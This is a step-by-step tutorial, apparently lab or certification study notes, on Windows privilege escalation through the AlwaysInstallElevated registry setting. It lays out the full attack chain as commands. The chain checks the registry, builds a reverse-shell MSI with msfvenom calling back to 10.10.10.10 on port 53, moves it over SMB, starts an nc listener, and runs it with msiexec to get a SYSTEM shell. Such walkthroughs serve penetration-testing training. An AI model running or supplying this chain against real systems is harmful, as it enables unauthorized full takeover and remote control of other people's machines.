
---

### 🧠 **What is AlwaysInstallElevated?**

- It’s a Windows setting meant for enterprise environments.
    
- If **both** registry keys (HKCU & HKLM) are set to `1`, **any `.msi` installer** run by a normal user will be executed with **SYSTEM privileges**.
    

---

### 🔍 **Step 1: Check the Registry Settings**

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- **What to look for:** Both should show:
    
    ```
    AlwaysInstallElevated    REG_DWORD    0x1
    ```
    
- ✅ This confirms the system is vulnerable.
    

---

### 🧪 **Step 2: Generate a Malicious Installer on Kali**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

- **What it does:** Creates a malicious `.msi` file that will connect back to your Kali machine on port 53.
    
- 🔁 **Update `LHOST`** with your Kali IP.
    

---

### 📤 **Step 3: Transfer the MSI to Windows**

- Use your **SMB share** from Kali or another method to move `reverse.msi` to `C:\PrivEsc\` on the Windows machine.
    

Example SMB server (on Kali):

```bash
impacket-smbserver share $(pwd) -smb2support
```

Then, from Windows:

```bash
copy \\10.10.10.10\share\reverse.msi C:\PrivEsc\
```

---

### 🎧 **Step 4: Start Listener on Kali**

```bash
nc -lvnp 53
```

- Make sure this matches the port in your `msfvenom` command (`LPORT=53`).
    
- Now Kali is waiting for the reverse shell connection.
    

---

### 🚀 **Step 5: Run the Installer as a Normal User**

```bash
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

- **What happens:** Because of the AlwaysInstallElevated setting, even though you're a **normal user**, this installer runs with **SYSTEM privileges**.
    
- The `.msi` file is actually your **reverse shell**, so...
    
- ✅ You get a **SYSTEM-level shell** on your Kali listener.
    

---
